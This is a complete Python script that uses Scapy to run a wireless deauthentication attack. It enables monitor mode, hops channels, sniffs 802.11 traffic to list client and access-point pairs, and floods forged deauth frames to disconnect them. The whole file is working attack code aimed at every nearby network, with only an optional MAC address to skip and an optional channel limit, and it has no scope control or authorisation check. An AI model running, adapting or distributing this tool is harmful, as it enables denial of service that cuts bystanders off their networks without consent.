#!/usr/bin/env python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Shut up Scapy
from scapy.all import *
conf.verb = 0 # Scapy, I thought I told you to shut the hell up
import os
from threading import Thread
import sys
from subprocess import Popen, call, PIPE
from signal import SIGINT, SIGTERM, signal
from threading import Thread, Lock
import argparse

# Console colors
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan

def parse_args():
	#Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address. Example: -s 00:11:BB:33:44:AA")
    parser.add_argument("-i", "--interface", help="Choose monitor mode interface. By default script will find the most powerful interface and starts monitor mode on it. Example: -i mon5")
    parser.add_argument("-c", "--channel", help="Listen on and deauth only clients on the specified channel. Example: -c 6")
    parser.add_argument("-m", "--maximum", help="Choose the maximum number of clients to deauth. List of clients will be emptied and repopulated after hitting the limit. Example: -m 5")
    parser.add_argument("-t", "--timeinterval", help="Choose the time interval between packets being sent. Default is as fast as possible. If you see scapy errors like 'no buffer space' try: -t .00001")
    parser.add_argument("-p", "--packets", help="Choose the number of packets to send in each deauth burst. Default value is 1; 1 packet to the client and 1 packet to the AP. Send 2 deauth packets to the client and 2 deauth packets to the AP: -p 2")
    return parser.parse_args()


########################################
# Begin interface info and manipulation
########################################

def get_mon_iface(args):
    global monitor_on
    monitors, interfaces = iwconfig()
    if args.interface:
        monitor_on = True
        return args.interface
    if len(monitors) > 0:
        monitor_on = True
        return monitors[0]
    else:
        # Start monitor mode on a wireless interface
        print '['+G+'*'+W+'] Finding the most powerful interface...'
        interface = get_iface(interfaces)
        monmode = start_mon_mode(interface)
        return monmode

def iwconfig():
    monitors = []
    interfaces = {}
    proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if len(line) == 0: continue # Isn't an empty string
        if line[0] != ' ': # Doesn't start with space
            wired_search = re.search('eth[0-9]|em[0-9]|p[1-9]p[1-9]', line)
            if not wired_search: # Isn't wired
                iface = line[:line.find(' ')] # is the interface
                if 'Mode:Monitor' in line:
                    monitors.append(iface)
                elif 'IEEE 802.11' in line:
                    if "ESSID:\"" in line:
                        interfaces[iface] = 1
                    else:
                        interfaces[iface] = 0
    return monitors, interfaces

def get_iface(interfaces):
    scanned_aps = []

    if len(interfaces) < 1:
        sys.exit('['+R+'-'+W+'] No wireless interfaces found, bring one up and try again')
    if len(interfaces) == 1:
        for interface in interfaces:
            return interface

    # Find most powerful interface
    for iface in interfaces:
        count = 0
        proc = Popen(['iwlist', iface, 'scan'], stdout=PIPE, stderr=DN)
        for line in proc.communicate()[0].split('\n'):
            if ' - Address:' in line: # first line in iwlist scan for a new AP
               count += 1
        scanned_aps.append((count, iface))
        print '['+G+'+'+W+'] Networks discovered by '+G+iface+W+': '+T+str(count)+W
    try:
        interface = max(scanned_aps)[1]
        if interfaces[interface] == 1:
            raw_input('['+R+'-'+W+'] Disconnect '+G+interface+W+' from its network or channel hopping will fail. When done hit [ENTER]')
        return interface
    except Exception as e:
        for iface in interfaces:
            interface = iface
            print '['+R+'-'+W+'] Minor error:',e
            print '    Starting monitor mode on '+G+interface+W
            return interface

def start_mon_mode(interface):
    print '['+G+'+'+W+'] Starting monitor mode on '+G+interface+W
    proc = Popen(['airmon-ng', 'start', interface], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if 'monitor mode enabled on' in line:
            line = line.split()
            monmode = line[4][:-1] # -1 because it ends in ')'
            return monmode

def remove_mon_iface():
    proc = Popen(['airmon-ng', 'stop', mon_iface], stdout=PIPE, stderr=DN)

def mon_mac(mon_iface):
    proc = Popen(['ifconfig'], stdout=PIPE, stderr=DN)
    for line in proc.communicate()[0].split('\n'):
        if mon_iface in line:
            line = line.split()
            mac = line[4][:17]
            if '-' in mac:
                mac = mac.replace('-', ':')
            print '['+G+'*'+W+'] Monitor mode: '+G+mon_iface+W+' - '+O+mac+W
            return mac

########################################
# End of interface info and manipulation
########################################


def deauth():
    '''
    addr1=destination, addr2=source, addr3=bssid, addr4=bssid of gateway if there's
    multi-APs to one gateway. Constantly scans the clients_APs list and
    starts a thread to deauth each instance
    '''
    global timer, timer2
    pkts = []
    while 1:
        if len(clients_APs) > 0:
            with lock:
                for x in clients_APs:
                    client = x[0]
                    ap = x[1]
                    # Can't add a RadioTap() layer as the first layer or it's a malformed
                    # Association request packet?
                    # Append the packets to a new list so we don't have to hog the lock
                    # type=0, subtype=12?
                    deauth_pkt1 = Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
                    pkts.append(deauth_pkt1)
                    deauth_pkt2 = Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
                    pkts.append(deauth_pkt2)
            if len(pkts) > 0:
                with lock:
                    timer = time.time()

                if not args.timeinterval:
                    args.timeinterval = 0
                if not args.packets:
                    args.packets = 1

                for pkt in pkts:
                    send(pkt, inter=float(args.timeinterval), count=int(args.packets))
                    # prevent 'no buffer space' error http://goo.gl/6YuJbI
                with lock:
                    timer2 = time.time()

def channel_hop(mon_iface, args):
    channelNum = 0
    while 1:
        if args.channel:
            monchannel = args.channel
        else:
            channelNum +=1
            if channelNum > 11:
                channelNum = 1
            monchannel = str(channelNum)
        proc = Popen(['iw', 'dev', mon_iface, 'set', 'channel', monchannel], stdout=DN, stderr=PIPE)
        err = None
        for line in proc.communicate()[1].split('\n'):
            if len(line) > 2: # iw dev shouldnt display output unless there's an error
                err = '['+R+'-'+W+'] Channel hopping failed: '+R+line+W+'\n    \
Try disconnecting the monitor mode\'s parent interface (e.g. wlan0)\n    \
from the network if you have not already\n'
        output(err, monchannel)
        time.sleep(1)

def stop(signal, frame):
    if monitor_on:
        sys.exit('\n['+R+'!'+W+'] Closing')
    else:
        remove_mon_iface()
        sys.exit('\n['+R+'!'+W+'] Closing')

def cb(pkt):
    '''
    Look for dot11 packets that aren't to or from broadcast address,
    are type 1 or 2 (control, data), and append the addr1 and addr2
    to the list of deauth targets.
    '''
    global clients_APs, APs

    # return these if's keeping clients_APs the same or just reset clients_APs?
    # I like the idea of the tool repopulating the variable more
    if args.maximum:
        if len(clients_APs) > int(args.maximum):
            clients_APs = []
            APs = []

    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
    if args.skip:
        ignore.append(args.skip)

    # We're adding the AP and channel to the deauth list at time of creation rather
    # thank updating on the fly in order to avoid costly for loops that require a lock
    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            for i in ignore:
                if i in pkt.addr1 or i in pkt.addr2:
                    return

            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                add_APs(clients_APs, APs, pkt)

            # Management = 1, data = 2
            if pkt.type in [1, 2]:
                clients_APs_add(clients_APs, pkt)

def add_APs(clients_APs, APs, pkt):
    ssid       = pkt[Dot11Elt].info
    bssid      = pkt[Dot11].addr3
    ap_channel = str(ord(pkt[Dot11Elt:3].info))
    if len(APs) == 0:
        with lock:
            return APs.append([bssid, ap_channel, ssid])
    else:
        for b in APs:
            if bssid in b[0]:
                return
        with lock:
            return APs.append([bssid, ap_channel, ssid])

def clients_APs_add(clients_APs, pkt):
    if len(clients_APs) == 0:
        clients_APs.append([pkt.addr1, pkt.addr2])

    # Append new clients/APs if they're not in the list
    else:
        for ca in clients_APs:
            if pkt.addr1 in ca and pkt.addr2 in ca:
                return
        for ap in APs:
            if ap[0] in pkt.addr1 or ap[0] in pkt.addr2:
                return clients_APs.append([pkt.addr1, pkt.addr2, ap[1], ap[2]])
            else:
                return clients_APs.append([pkt.addr1, pkt.addr2])

def output(err, monchannel):
    global ap_update, clients_APs, timer, timer2

    ap_update += 1
    os.system('clear')
    if err:
        print err
    else:
        print '['+G+'+'+W+'] '+mon_iface+' channel: '+G+monchannel+W+'\n'
    print '                  Deauthing                 ch   ESSID'

    # Update the deauth list with channel and ESSID every 5 seconds
    # Updating requires a costly thread-shared object lock
    # So we don't want to do it too often
    if ap_update % 5 == 0:
        clients_APs = updated()

    with lock:
        for ca in clients_APs:
            if len(ca) > 2:
                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W+' - '+ca[2].ljust(2)+' - '+T+ca[3]+W
            else:
                print '['+T+'*'+W+'] '+O+ca[0]+W+' - '+O+ca[1]+W
    with lock:
        if timer != 0 and timer2 != 0:
            if timer > timer2:
                print '['+G+'*'+W+'] Took'+G,(timer-timer2), W+'seconds to send last deauth burst'

def updated():
    new_clients_APs = []
    with lock:
        if len(clients_APs) > 0 and len(APs) > 0:
            updated = []
            for ca in clients_APs:
                update = 0
                for ap in APs:
                    if ap[0] in ca[0] or ap[0] in ca[1]:
                        new_clients_APs.append([ca[0], ca[1], ap[1], ap[2]])
                        update = 1
                        break
                if update == 0:
                    new_clients_APs.append(ca)
            return new_clients_APs
        else:
            return clients_APs

if __name__ == "__main__":

    DN = open(os.devnull, 'w')
    lock = Lock()
    args = parse_args()
    clients_APs = []
    APs = []
    ap_update = 0
    monitor_on = None
    mon_iface = get_mon_iface(args)
    conf.iface = mon_iface
    mon_MAC = mon_mac(mon_iface)
    timer = 0
    timer2 = 0

    # Start channel hopping
    hop = Thread(target=channel_hop, args=(mon_iface, args))
    hop.daemon = True
    hop.start()

    # Start the deauth thread
    d = Thread(target=deauth)
    d.daemon = True
    d.start()

    signal(SIGINT, stop)
    try:
       sniff(iface=mon_iface, store=0, prn=cb)
    except Exception as msg:
        print '\n['+R+'!'+W+'] Closing:', msg
        sys.exit(0)
